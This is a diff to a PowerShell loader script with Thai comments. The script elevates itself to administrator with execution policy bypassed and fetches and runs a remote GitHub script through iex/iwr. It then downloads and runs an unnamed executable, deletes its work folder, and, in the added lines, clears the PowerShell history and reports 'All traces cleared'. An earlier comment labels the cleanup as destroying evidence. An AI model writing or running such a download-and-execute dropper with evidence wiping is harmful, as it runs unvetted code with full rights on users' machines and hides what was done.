@@ -1,6 +1,6 @@
 # 1. ขอสิทธิ์ Admin
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"iex ((iwr 'https://raw.githubusercontent.com/getx796-Harem/GetX/refs/heads/main/run.ps1').Content)`"" -Verb RunAs
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"iex ((iwr 'https://raw.githubusercontent.com/getx796-Harem/GetX/main/run.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
     exit
 }
 
@@ -17,13 +17,16 @@ New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 Write-Host "[*] Downloading System..." -ForegroundColor Cyan
 Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing
 
-# 5. รันและรอจนกว่าจะปิดโปรแกรม (-Wait)
+# 5. รันและรอจนกว่าจะปิดโปรแกรม
 if (Test-Path $exePath) {
     Write-Host "[+] Launching..." -ForegroundColor Green
-    # สั่งให้รันและรอจนโปรแกรมปิด ถึงจะข้ามไปทำบรรทัดถัดไป
     Start-Process -FilePath $exePath -WorkingDirectory $workDir -Wait
 }
 
-# 6. ขั้นตอนการลบ (ทำลายหลักฐาน)
-Write-Host "[*] Cleaning up..." -ForegroundColor Yellow
+# 6. ลบไฟล์ทิ้งทันที
 Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
+
+# 7. ล้างประวัติการพิมพ์ใน PowerShell (History)
+Clear-History
+[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
+Write-Host "[+] All traces cleared." -ForegroundColor Magenta
